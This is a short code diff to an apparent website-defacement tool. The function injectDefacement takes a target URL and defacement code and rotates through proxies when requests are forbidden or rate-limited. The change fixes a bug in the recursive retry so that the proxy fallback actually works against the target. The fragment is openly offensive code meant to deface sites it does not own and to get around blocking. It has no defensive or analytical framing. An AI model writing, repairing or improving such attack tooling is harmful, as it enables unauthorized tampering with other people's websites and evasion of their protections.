@@ -197,9 +197,9 @@ async function injectDefacement(targetURL, defacementCode, attempts = 0) {
                 // If proxy is forbidden or rate limited, try another one
                 if (attempts < proxies.length) {
                     logAction(`Proxy ${proxy} failed, trying another...`);
-                    return injectDefacement(url, defacementCode, attempts + 1); // Recursive call with next proxy
+                    return injectDefacement(targetURL, defacementCode, attempts + 1); // Recursive call with next proxy
                 } else {
-                    throw new Error(`All proxies failed for URL: ${url}`);
+                    throw new Error(`All proxies failed for URL: ${targetURL}`);
                 }
             }
             throw new Error(`HTTP error! Status: ${response.status}`);
